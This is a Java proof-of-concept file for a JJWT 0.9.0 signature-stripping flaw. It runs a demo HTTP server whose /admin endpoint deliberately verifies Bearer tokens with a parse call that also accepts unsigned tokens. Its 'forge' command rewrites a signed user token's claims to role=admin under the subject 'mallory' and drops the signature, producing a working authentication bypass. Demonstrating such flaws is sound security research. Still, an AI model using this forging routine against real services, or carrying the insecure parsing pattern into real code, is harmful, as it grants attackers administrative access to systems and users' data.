package poc;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwt;
import io.jsonwebtoken.JwtException;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.Executors;

public final class VulnerableJwtApp {
    private static final byte[] SIGNING_KEY =
        "cgp-demo-signing-key-32-bytes!!".getBytes(StandardCharsets.UTF_8);
    private static final ObjectMapper JSON = new ObjectMapper();

    private VulnerableJwtApp() {
    }

    public static void main(String[] args) throws Exception {
        String command = args.length == 0 ? "serve" : args[0];

        if ("serve".equals(command)) {
            serve();
            return;
        }
        if ("forge".equals(command) && args.length == 2) {
            System.out.println(forgeAdminToken(args[1]));
            return;
        }

        System.err.println("Usage: java -jar vulnerable-jwt-app.jar [serve | forge <signed-token>]");
        System.exit(2);
    }

    private static void serve() throws IOException, InterruptedException {
        HttpServer server = HttpServer.create(new InetSocketAddress("0.0.0.0", 8080), 0);
        server.createContext("/", new IndexHandler());
        server.createContext("/token", new TokenHandler());
        server.createContext("/admin", new AdminHandler());
        server.setExecutor(Executors.newCachedThreadPool());
        server.start();
        System.out.println("Vulnerable JJWT 0.9.0 demo listening on http://0.0.0.0:8080");
        new CountDownLatch(1).await();
    }

    private static String issueUserToken() {
        return Jwts.builder()
            .setSubject("alice")
            .claim("role", "user")
            .setIssuedAt(new Date())
            .signWith(SignatureAlgorithm.HS256, SIGNING_KEY)
            .compact();
    }

    private static String forgeAdminToken(String signedToken) throws IOException {
        String[] parts = signedToken.split("\\.", -1);
        if (parts.length != 3 || parts[0].isEmpty() || parts[1].isEmpty() || parts[2].isEmpty()) {
            throw new IllegalArgumentException("Expected a signed three-segment JWT");
        }

        byte[] payloadBytes = Base64.getUrlDecoder().decode(parts[1]);
        Map<String, Object> claims = JSON.readValue(
            payloadBytes,
            new TypeReference<LinkedHashMap<String, Object>>() { }
        );
        claims.put("sub", "mallory");
        claims.put("role", "admin");

        String forgedPayload = Base64.getUrlEncoder()
            .withoutPadding()
            .encodeToString(JSON.writeValueAsBytes(claims));

        // Keep the original HS256 header, replace the claims, and deliberately
        // leave the signature segment empty. No signing key is needed.
        return parts[0] + "." + forgedPayload + ".";
    }

    private static final class IndexHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            if (!requireGet(exchange)) {
                return;
            }
            respond(exchange, 200,
                "JJWT 0.9.0 signature-stripping PoC\n" +
                "GET /token - issue a signed role=user token\n" +
                "GET /admin - authorize the Bearer token using vulnerable parse(String)\n");
        }
    }

    private static final class TokenHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            if (!requireGet(exchange)) {
                return;
            }
            respond(exchange, 200, issueUserToken());
        }
    }

    private static final class AdminHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            if (!requireGet(exchange)) {
                return;
            }

            String authorization = exchange.getRequestHeaders().getFirst("Authorization");
            if (authorization == null || !authorization.startsWith("Bearer ")) {
                respond(exchange, 401, "REJECTED: missing Bearer token");
                return;
            }

            String token = authorization.substring("Bearer ".length()).trim();
            try {
                // Intentionally vulnerable usage. parse(String) accepts both signed JWSs
                // and unsigned JWTs, even though a signing key has been configured.
                Jwt parsed = Jwts.parser()
                    .setSigningKey(SIGNING_KEY)
                    .parse(token);
                Claims claims = (Claims) parsed.getBody();

                if ("admin".equals(claims.get("role"))) {
                    respond(exchange, 200,
                        "ACCEPTED: admin access granted to " + claims.getSubject());
                } else {
                    respond(exchange, 403,
                        "REJECTED: role=" + claims.get("role"));
                }
            } catch (SecurityException e) {
                respond(exchange, 401,
                    "REJECTED by SECURITY EXCEPTION: " + e.getMessage());
            } catch (JwtException e) {
                respond(exchange, 401,
                    "REJECTED by JJWT: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            } catch (RuntimeException e) {
                respond(exchange, 400,
                    "REJECTED: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            }
        }
    }

    private static boolean requireGet(HttpExchange exchange) throws IOException {
        if ("GET".equals(exchange.getRequestMethod())) {
            return true;
        }
        respond(exchange, 405, "Method not allowed");
        return false;
    }

    private static void respond(HttpExchange exchange, int status, String body) throws IOException {
        byte[] bytes = (body + "\n").getBytes(StandardCharsets.UTF_8);
        exchange.getResponseHeaders().set("Content-Type", "text/plain; charset=utf-8");
        exchange.sendResponseHeaders(status, bytes.length);
        try (OutputStream output = exchange.getResponseBody()) {
            output.write(bytes);
        }
    }
}
